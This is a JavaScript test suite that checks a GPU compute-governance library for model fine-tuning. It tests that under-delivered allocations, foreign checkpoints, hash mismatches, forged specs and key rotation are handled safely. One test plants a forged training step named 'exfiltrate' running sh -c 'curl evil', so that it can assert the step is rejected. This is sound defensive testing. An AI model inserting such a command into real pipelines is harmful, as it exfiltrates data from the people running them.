/**
 * Governed Compute Realization — adversarial production certification.
 *
 * This suite attacks capacity honesty, observation uncertainty, checkpoint
 * lineage, artifact identity, cancellation/release, caller-authored authority,
 * key rotation, dataset-manifest laundering, and promotion boundaries.
 */

import { test } from "node:test";
import assert from "node:assert/strict";
import path from "node:path";
import { fileURLToPath, pathToFileURL } from "node:url";

const repoRoot = path.resolve(path.dirname(fileURLToPath(import.meta.url)), "..");
const kitApp = path.join(repoRoot, "cli/assets/worker-kits/growthub-custom-workspace-starter-v1/apps/workspace");
const lib = (rel) => pathToFileURL(path.join(kitApp, "lib", rel)).href;

const {
  executeProviderComputeRun,
  cancelProviderComputeRun,
  maybeExecuteProviderComputeForSandboxRun,
} = await import(lib("compute-execution.js"));
const {
  COMPUTE_AUTHORITY_KEY_ENV,
  compileComputeAuthority,
  verifyComputeAuthorityAgainstWorkspace,
} = await import(lib("compute-authority.js"));
const { hashComputeValue } = await import(lib("compute-work-spec.js"));
const { deriveComputeLifecycle, deriveComputeArtifactHonesty } = await import(lib("compute-evidence.js"));
const { deriveBenchmarkWins } = await import(lib("distillation-eval-harness.js"));
const { deriveFlywheelState } = await import(lib("distillation-fleet.js"));
const { deriveComputeCustomerState } = await import(lib("compute-customer-state.js"));

const RUN_ID = "trainrun_adv";
const AUTH_ENV = { [COMPUTE_AUTHORITY_KEY_ENV]: "adversarial-suite-key" };

function providerRow() {
  return {
    integrationId: "adv-remote",
    Name: "Adversarial remote",
    metadata: {
      computeProvider: {
        schema: "growthub-compute-provider-v1",
        adapterId: "adv-adapter",
        capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"],
        availabilityModes: ["on-demand"],
        requiredEnv: [],
        executionLane: "sandbox-local",
        config: {},
      },
    },
  };
}

const CONFIG = {
  dataModel: {
    objects: [{ id: "api-registry", objectType: "api-registry", rows: [providerRow()] }],
  },
};

function adapterWith(overrides = {}) {
  const calls = { allocate: 0, execute: 0, status: 0, cancel: 0, release: 0 };
  return {
    id: "adv-adapter",
    label: "adv",
    description: "",
    locality: "remote",
    calls,
    describeCapabilities() {
      return {
        providerId: "adv-remote",
        adapterId: "adv-adapter",
        capacityProfiles: ["single-gpu-finetune", "multi-gpu-finetune"],
        availabilityModes: ["on-demand"],
        acceleratorClasses: ["any-gpu", "datacenter-gpu", "high-memory-gpu"],
        maxVramPerGpuGB: 141,
        maxGpusPerWorker: 8,
        maxWorkers: 4,
        supportsCheckpointing: true,
        supportsResume: true,
        supportsGangScheduling: true,
        regions: [],
        requiredEnv: [],
      };
    },
    async inspectCapacity(ctx) {
      return {
        providerId: "adv-remote",
        capacityProfileId: ctx.capacityProfileId,
        available: true,
        availabilityMode: "on-demand",
        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
        estimatedTotalUsd: 2,
        queueLatencySeconds: 0,
        quoteObservedAt: "2026-07-20T12:00:00.000Z",
        quoteExpiresAt: "2026-07-20T13:00:00.000Z",
        quoteRef: "",
      };
    },
    async allocate(ctx) {
      calls.allocate += 1;
      return {
        allocationId: "alloc-adv",
        runRef: { ...ctx.runRef, providerResourceId: "res-adv" },
        status: "allocated",
        idempotencyKeyHash: ctx.idempotencyKeyHash,
        availabilityMode: "on-demand",
        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
        requestedAt: "t",
        allocatedAt: "t",
        releasedAt: "",
        releaseConfirmed: false,
        allocated: { gpuType: "A100", gpuCount: 4, workers: 1, region: "" },
      };
    },
    async execute(ctx) {
      calls.execute += 1;
      return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "queued", detail: "" }];
    },
    async status(ctx) {
      calls.status += 1;
      if (calls.status === 1) return [{ type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "running", detail: "" }];
      return [{ type: "compute-completed", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "completed", detail: "" }];
    },
    async collectArtifact(ctx) {
      return {
        runRef: { ...ctx.runRef },
        kind: "gguf",
        locator: "volume://artifact/model.gguf",
        sha256: "d".repeat(64),
        sizeBytes: 100,
        evidenceObservedAt: "t",
      };
    },
    async cancel(ctx) {
      calls.cancel += 1;
      return [{ type: "compute-cancelled", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "cancelled", detail: "" }];
    },
    async release(ctx) {
      calls.release += 1;
      return [{ type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "released", detail: "" }];
    },
    ...overrides,
  };
}

function ioWith(adapter) {
  let clock = Date.parse("2026-07-20T12:00:00.000Z");
  const persisted = [];
  return {
    getAdapter: (id) => id === "adv-adapter" ? adapter : null,
    listAdapterIds: () => ["adv-adapter"],
    envPresent: () => true,
    resolveEnv: () => "",
    fetchJson: async () => { throw new Error("no network"); },
    now: () => { clock += 1000; return clock; },
    sleep: async () => {},
    maxPolls: 3,
    pollIntervalMs: 0,
    persistCompute: async (block) => { persisted.push(JSON.parse(JSON.stringify(block))); },
    verifyArtifact: async (artifact) => ({ verifiedSha256: artifact.sha256, verificationKind: "test-materialized", sizeBytes: artifact.sizeBytes }),
    persisted,
  };
}

const REQ8 = {
  workloadKind: "fine-tune",
  acceleratorClass: "datacenter-gpu",
  gpuCount: 8,
  minVramPerGpuGB: 80,
  minCpuCores: 8,
  minRamGB: 64,
  minDiskGB: 200,
  checkpointRequired: true,
  distributed: null,
  locality: { regions: [], dataResidency: "" },
  estimatedDurationMinutes: 60,
};

test("ADVERSARIAL — under-delivered GPU allocation fails closed and releases", async () => {
  const adapter = adapterWith(); // reports 4 GPUs for an 8-GPU ask
  const outcome = await executeProviderComputeRun({
    workspaceConfig: CONFIG,
    trainingRunId: RUN_ID,
    computeAsk: { capacityProfileId: "multi-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit" },
    requirements: REQ8,
    io: ioWith(adapter),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /allocation evidence mismatch/);
  assert.match(outcome.result.error, /asked for 8 GPU/);
  const types = outcome.computeBlock.events.map((event) => event.type);
  assert.ok(types.includes("compute-failed"));
  assert.ok(types.includes("compute-released"));
  assert.equal(adapter.calls.execute, 0, "workload never executes on insufficient capacity");
});

test("ADVERSARIAL — provider timeout remains pending and does not release a possibly-running job", async () => {
  const adapter = adapterWith({
    async allocate(ctx) {
      adapter.calls.allocate += 1;
      return {
        allocationId: "alloc-timeout",
        runRef: { ...ctx.runRef, providerResourceId: "res-timeout" },
        status: "allocated",
        idempotencyKeyHash: ctx.idempotencyKeyHash,
        availabilityMode: "on-demand",
        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
        requestedAt: "t",
        allocatedAt: "t",
        releasedAt: "",
        releaseConfirmed: false,
        allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" },
      };
    },
    async status() { adapter.calls.status += 1; throw new Error("ETIMEDOUT: provider API unreachable"); },
  });
  const outcome = await executeProviderComputeRun({
    workspaceConfig: CONFIG,
    trainingRunId: RUN_ID,
    computeAsk: { capacityProfileId: "single-gpu-finetune", providerRegistryId: "adv-remote", selectionMode: "explicit" },
    requirements: { ...REQ8, gpuCount: 1 },
    io: ioWith(adapter),
  });
  assert.equal(outcome.result.ok, true);
  assert.equal(outcome.result.exitCode, null);
  assert.equal(outcome.result.adapterMeta.compute.pending, true);
  assert.equal(outcome.result.adapterMeta.compute.remoteStateUnverified, true);
  assert.equal(adapter.calls.release, 0, "uncertain observation never fabricates termination");
  assert.equal(outcome.computeBlock.events.some((event) => event.type === "compute-failed"), false);
  assert.ok(outcome.computeBlock.events.some((event) => /ETIMEDOUT|remote-state-unverified/.test(event.detail)));
});

test("ADVERSARIAL — a checkpoint from another run cannot satisfy resume", () => {
  const myRef = { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "p", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-1" };
  const events = [
    { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { ...myRef, providerResourceId: "" }, providerEventId: "rq", detail: "" },
    { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e1", detail: "" },
    { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e2", detail: "" },
    { type: "compute-resuming", at: "t", evidenceObservedAt: "t", source: "provider", runRef: myRef, providerEventId: "e3", detail: "" },
  ];
  const foreign = { checkpointId: "ck-other", runRef: { ...myRef, trainingRunId: "some_other_run" }, locator: "s3://ck/other", sha256: "a".repeat(64), step: 999 };
  const refused = deriveComputeLifecycle({ events, checkpoints: [foreign] });
  assert.ok(refused.refused.some((entry) => /no proven checkpoint/.test(entry.reason)));
  assert.equal(refused.provenCheckpoints.length, 0);
  const mine = { ...foreign, checkpointId: "ck-mine", runRef: myRef };
  const accepted = deriveComputeLifecycle({ events, checkpoints: [mine] });
  assert.equal(accepted.provenCheckpoints.length, 1);
  assert.equal(accepted.resumed, true);
});

test("ADVERSARIAL — artifact hash mismatch is non-promotable", () => {
  const lifecycle = { terminal: "completed" };
  const artifact = { runRef: {}, kind: "gguf", locator: "s3://out/m.gguf", sha256: "b".repeat(64), verifiedSha256: "b".repeat(64), sizeBytes: 1, evidenceObservedAt: "t", providerAttestationVerified: true };
  const mismatch = deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "c".repeat(64) });
  assert.equal(mismatch.promotable, false);
  assert.equal(mismatch.reasonCode, "artifact-hash-mismatch");
  assert.equal(deriveComputeArtifactHonesty({ lifecycle, artifact, expectedSha256: "b".repeat(64) }).promotable, true);
});

test("ADVERSARIAL — failed cancel and release keep capacity/cost risk visible", async () => {
  const adapter = adapterWith({
    async cancel() { adapter.calls.cancel += 1; throw new Error("cancel endpoint 500"); },
    async release() { adapter.calls.release += 1; throw new Error("terminate endpoint 500"); },
  });
  const prior = {
    capacityProfileId: "single-gpu-finetune",
    idempotencyKeyHash: "h",
    allocation: {
      allocationId: "alloc-c",
      runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" },
      status: "running",
      idempotencyKeyHash: "h",
      availabilityMode: "on-demand",
      costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
      requestedAt: "t",
      allocatedAt: "t",
      releasedAt: "",
      releaseConfirmed: false,
      allocated: null,
    },
    events: [
      { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "rq", detail: "" },
      { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "res-c" }, providerEventId: "e1", detail: "" },
    ],
  };
  const outcome = await cancelProviderComputeRun({
    priorCompute: prior,
    provider: { providerId: "adv-remote", adapterId: "adv-adapter", config: {} },
    io: ioWith(adapter),
  });
  assert.equal(outcome.cancelled, false);
  assert.equal(outcome.capacityMayStillExist, true);
  assert.equal(outcome.costMayAccrue, true);
  assert.match(outcome.reason, /capacity may still exist|did not return verifiable cancellation/i);
});

// ---------------------------------------------------------------------------
// Server-owned authority attacks
// ---------------------------------------------------------------------------

function authorityRequest(overrides = {}) {
  return {
    schema: "growthub-compute-request-v1",
    policy: { mode: "cloud", excludeLocal: true },
    selectionMode: "explicit",
    providerRegistryId: "adv-remote",
    capacityProfileId: "single-gpu-finetune",
    trainingProfileId: "unsloth-qlora-quantize-pipeline",
    baseModel: "gemma3:4b",
    datasetExportId: "export-adv-1",
    datasetPath: "data/export-adv-1.jsonl",
    outputModelTag: "tuned-adv-v1",
    artifactPath: "artifacts/tuned-adv-v1",
    ...overrides,
  };
}

function authorityConfig({ request = authorityRequest(), compute = null, reservedTag = "tuned-adv-v1" } = {}) {
  return {
    dataModel: {
      objects: [
        { id: "api-registry", objectType: "api-registry", rows: [providerRow()] },
        {
          id: "model-training",
          objectType: "model-training",
          rows: [{
            Name: "workspace-local-v1",
            baseModel: "gemma3:4b",
            localModel: reservedTag,
            apiRegistryId: "",
            lastExportId: "export-adv-1",
            lastExportSummary: JSON.stringify({ recordCount: 6, path: "data/export-adv-1.jsonl", version: 1 }),
          }],
        },
        {
          id: "model-training-run",
          objectType: "model-training-run",
          rows: [{
            trainingRunId: RUN_ID,
            modelTrainingRowId: "workspace-local",
            datasetExportId: "export-adv-1",
            baseModel: "gemma3:4b",
            trainingProfile: "unsloth-qlora-quantize-pipeline",
            status: "running",
            preflight: { ramGB: 16, diskFreeGB: 200, gpu: { present: false, name: "", vramFreeGB: 0 } },
            computeRequest: JSON.stringify(request),
            ...(compute ? { compute: JSON.stringify(compute) } : {}),
          }],
        },
      ],
    },
  };
}

const AUTH_MANIFEST = {
  schema: "growthub-compute-dataset-manifest-v1",
  exportId: "export-adv-1",
  manifestHash: "e".repeat(64),
  corpusSha256: "f".repeat(64),
  sizeBytes: 2048,
  recordCount: 20,
  binding: "materialized-bytes",
};

function authorityIo(adapter, workspaceConfig, env = AUTH_ENV) {
  return {
    ...ioWith(adapter),
    // Server-owned data plane, stubbed at the same io seam the production
    // route wires: materialized manifest → sealed grant → delivery receipt.
    materializeDataset: async () => ({ ok: true, manifest: { ...AUTH_MANIFEST } }),
    issueDatasetAccess: async ({ manifest, trainingRunId, workSpecHash }) => ({
      ok: true,
      access: { uri: "http://127.0.0.1:0/api/workspace/compute-data/test-token", workSpecHash, corpusSha256: manifest.corpusSha256, sizeBytes: manifest.sizeBytes },
      evidence: {
        schema: "growthub-compute-dataset-access-v1",
        tokenId: "token-adv",
        trainingRunId,
        workSpecHash,
        exportId: manifest.exportId,
        corpusSha256: manifest.corpusSha256,
        sizeBytes: manifest.sizeBytes,
        recordCount: manifest.recordCount,
        deliveryStatus: "issued",
      },
    }),
    verifyDatasetDelivery: async () => ({ ok: true, receipt: { deliveredAt: "2026-07-20T12:00:06.000Z" } }),
    compileAuthority: ({ trainingRunId, request, datasetManifest }) => compileComputeAuthority({ workspaceConfig, trainingRunId, request, datasetManifest, now: "2026-07-20T12:00:00.000Z", env }),
    verifyAuthority: (authority, datasetManifest) => verifyComputeAuthorityAgainstWorkspace({ workspaceConfig, trainingRunId: RUN_ID, authority, datasetManifest, env }),
  };
}

test("ADVERSARIAL — caller-authored self-consistent spec is ignored; server spec reaches every provider boundary", async () => {
  const forgedIntentBody = {
    schema: "growthub-compute-intent-v1",
    adaptivePlan: { mode: "x", tier: "x", baseModel: "gemma3:4b" },
    capacityProfileId: "single-gpu-finetune",
    requirements: {},
    requirementsHash: hashComputeValue({}),
    policy: { mode: "cloud" },
    training: {},
  };
  const forgedIntent = { ...forgedIntentBody, intentHash: hashComputeValue(forgedIntentBody) };
  const forgedSpecBody = {
    schema: "growthub-training-execution-spec-v1",
    intentHash: forgedIntent.intentHash,
    requirementsHash: forgedIntent.requirementsHash,
    capacityProfileId: "single-gpu-finetune",
    trainingRunId: RUN_ID,
    modelTrainingRowId: "workspace-local",
    training: { steps: [{ stageId: "exfiltrate", label: "attacker step", bin: "sh", args: ["-c", "curl evil"] }] },
    dataset: { exportId: "export-adv-1", path: "", corpusSha256: "" },
    output: { modelTag: "attacker-tag", artifactPath: "/tmp/attacker", expectedKinds: [] },
  };
  const forgedSpec = { ...forgedSpecBody, workSpecHash: hashComputeValue(forgedSpecBody) };
  const seen = [];
  const adapter = adapterWith({
    async allocate(ctx) {
      adapter.calls.allocate += 1;
      seen.push(ctx.workSpecHash);
      assert.equal(ctx.workSpec.output.modelTag, "tuned-adv-v1");
      return {
        allocationId: "alloc-authority",
        runRef: { ...ctx.runRef, providerResourceId: "res-authority" },
        status: "allocated",
        idempotencyKeyHash: ctx.idempotencyKeyHash,
        availabilityMode: "on-demand",
        costBasis: { kind: "per-hour", unitUsd: 1, source: "" },
        requestedAt: "t",
        allocatedAt: "t",
        releasedAt: "",
        releaseConfirmed: false,
        allocated: { gpuType: "A100", gpuCount: 1, workers: 1, region: "" },
      };
    },
    async execute(ctx) {
      adapter.calls.execute += 1;
      seen.push(ctx.workSpecHash);
      return [{ type: "compute-queued", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { ...ctx.runRef }, providerEventId: "q1", detail: "" }];
    },
  });
  const workspaceConfig = authorityConfig({
    compute: { schema: "growthub-compute-evidence-v1", intent: forgedIntent, workSpec: forgedSpec },
  });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, workspaceConfig),
  });
  const serverHash = outcome.computeBlock.authority.workSpecHash;
  assert.notEqual(serverHash, forgedSpec.workSpecHash);
  for (const observed of seen) assert.equal(observed, serverHash);
  assert.equal(JSON.stringify(outcome.computeBlock.workSpec).includes("attacker-tag"), false);
});

test("ADVERSARIAL — governed input drift after sealing fails before provider submission", async () => {
  const originalConfig = authorityConfig();
  const sealed = compileComputeAuthority({ workspaceConfig: originalConfig, trainingRunId: RUN_ID, env: AUTH_ENV });
  assert.equal(sealed.ok, true, sealed.reason);
  const driftedConfig = authorityConfig({
    request: authorityRequest({ outputModelTag: "tuned-adv-v2", artifactPath: "artifacts/tuned-adv-v2" }),
    reservedTag: "tuned-adv-v2",
    compute: { schema: "growthub-compute-evidence-v1", authority: sealed.authority },
  });
  const adapter = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: driftedConfig,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, driftedConfig),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /changed after compute authority was sealed/);
  assert.equal(adapter.calls.allocate, 0);
});

test("KEY ROTATION — identical content reseals, changed content refuses", async () => {
  const KEY_A = { [COMPUTE_AUTHORITY_KEY_ENV]: "rotation-key-a" };
  const KEY_B = { [COMPUTE_AUTHORITY_KEY_ENV]: "rotation-key-b" };
  const baseConfig = authorityConfig();
  // Production always compiles with the staged dataset manifest; the sealed
  // baseline must carry the same manifest binding the rerun will stage.
  const sealedUnderA = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, datasetManifest: AUTH_MANIFEST, env: KEY_A });
  assert.equal(sealedUnderA.ok, true);

  const unchanged = authorityConfig({ compute: { schema: "growthub-compute-evidence-v1", authority: sealedUnderA.authority } });
  const adapter = adapterWith();
  const resealed = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: unchanged,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, unchanged, KEY_B),
  });
  assert.equal(resealed.computeBlock.authority.authorityHash, sealedUnderA.authority.authorityHash);
  assert.notEqual(resealed.computeBlock.authority.keyId, sealedUnderA.authority.keyId);

  const changed = authorityConfig({
    request: authorityRequest({ outputModelTag: "tuned-adv-v2", artifactPath: "artifacts/tuned-adv-v2" }),
    reservedTag: "tuned-adv-v2",
    compute: { schema: "growthub-compute-evidence-v1", authority: sealedUnderA.authority },
  });
  const trapped = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
  const refused = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: changed,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(trapped, changed, KEY_B),
  });
  assert.equal(refused.result.ok, false);
  assert.match(refused.result.error, /changed after compute authority was sealed/);
  assert.equal(trapped.calls.allocate, 0);
});

test("ADVERSARIAL — forged persisted dataset manifest cannot launder itself into recompilation", () => {
  const baseConfig = authorityConfig();
  const { authority } = compileComputeAuthority({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, env: AUTH_ENV });
  const poisoned = {
    ...authority,
    dataset: { ...authority.dataset, corpusSha256: "0".repeat(64), sizeBytes: 1, binding: "manifest" },
    seal: "0".repeat(64),
  };
  const verdict = verifyComputeAuthorityAgainstWorkspace({ workspaceConfig: baseConfig, trainingRunId: RUN_ID, authority: poisoned, env: AUTH_ENV });
  assert.equal(verdict.ok, false);
  assert.ok(verdict.recompiled);
  assert.equal(verdict.recompiled.dataset.corpusSha256, "");
  assert.equal(verdict.recompiled.dataset.binding, "metadata-only");
});

test("ADVERSARIAL — missing output identity refuses remote compute before provider IO", async () => {
  const config = authorityConfig({ request: authorityRequest({ outputModelTag: "" }) });
  const adapter = adapterWith({ async allocate() { throw new Error("allocate must never be reached"); } });
  const outcome = await maybeExecuteProviderComputeForSandboxRun({
    workspaceConfig: config,
    objectId: "model-training-runner",
    name: RUN_ID,
    io: authorityIo(adapter, config),
  });
  assert.equal(outcome.result.ok, false);
  assert.match(outcome.result.error, /authority compilation failed \(output-identity-missing\)/);
  assert.equal(adapter.calls.allocate, 0);
});

// ---------------------------------------------------------------------------
// Promotion remains a workspace-owned evaluation boundary
// ---------------------------------------------------------------------------

test("PROMOTION BOUNDARY — compute completion cannot promote without canonical measured wins", () => {
  assert.equal(deriveBenchmarkWins({ results: [] }).promoted, false);
  assert.equal(deriveBenchmarkWins({ results: [
    { taskId: "t1", student: { quality: 0.2 }, baseline: { quality: 0.9 } },
    { taskId: "t2", student: { quality: 0.3 }, baseline: { quality: 0.8 } },
    { taskId: "t3", student: { quality: 0.1 }, baseline: { quality: 0.9 } },
    { taskId: "t4", student: { quality: 0.4 }, baseline: { quality: 0.9 } },
    { taskId: "t5", student: { quality: 0.2 }, baseline: { quality: 0.7 } },
  ] }).promoted, false);

  const receipts = {
    "training-run:model-training:workspace-local": {
      records: [{
        schema: "growthub-local-model-training-run-v1",
        trainingRunId: RUN_ID,
        modelTrainingRowId: "workspace-local",
        status: "completed",
        artifact: { type: "gguf", modelTag: "tuned-v1", path: "/x.gguf", sha256: "d".repeat(64), quantization: "none" },
        distillation: { teacherModel: "", generation: 1, benchmarkWins: null },
        compute: { schema: "growthub-compute-evidence-v1", capacityProfileId: "single-gpu-finetune" },
      }],
    },
  };
  const flywheel = deriveFlywheelState({ workspaceConfig: {}, workspaceSourceRecords: receipts, slug: "workspace-local" });
  assert.equal(flywheel.steps.find((step) => step.id === "benchmark-promoted").done, false);

  const state = deriveComputeCustomerState({
    computeBlock: {
      schema: "growthub-compute-evidence-v1",
      capacityProfileId: "single-gpu-finetune",
      decision: { schema: "growthub-compute-decision-v1", selectedProviderId: "adv-remote", selectedReasons: [], candidates: [], budget: { mode: "advisory", maxTotalUsd: 0, maxHourlyUsd: 0, allowUnknownCost: false }, selectionMode: "auto", requirements: null, decidedAt: "t", evidenceObservedAt: "t" },
      allocation: { allocationId: "a", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, status: "completed", idempotencyKeyHash: "h", availabilityMode: "on-demand", costBasis: { kind: "per-hour", unitUsd: 1, source: "" }, requestedAt: "t", allocatedAt: "t", releasedAt: "t", releaseConfirmed: true, allocated: null },
      events: [
        { type: "compute-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "" }, providerEventId: "rq", detail: "" },
        { type: "compute-allocated", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "1", detail: "" },
        { type: "compute-running", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "2", detail: "" },
        { type: "compute-completed", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "3", detail: "" },
        { type: "compute-release-requested", at: "t", evidenceObservedAt: "t", source: "workspace", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "rr", detail: "" },
        { type: "compute-released", at: "t", evidenceObservedAt: "t", source: "provider", runRef: { trainingRunId: RUN_ID, modelTrainingRowId: "", providerId: "adv-remote", capacityProfileId: "single-gpu-finetune", providerResourceId: "r" }, providerEventId: "4", detail: "" },
      ],
      checkpoints: [],
      artifact: { runRef: {}, kind: "gguf", locator: "s3://out/m.gguf", sha256: "d".repeat(64), verifiedSha256: "d".repeat(64), sizeBytes: 1, evidenceObservedAt: "t", providerAttestationVerified: true },
      evidenceObservedAt: "t",
    },
    benchmarkWins: null,
  });
  assert.equal(state.stateId, "evaluating");
});
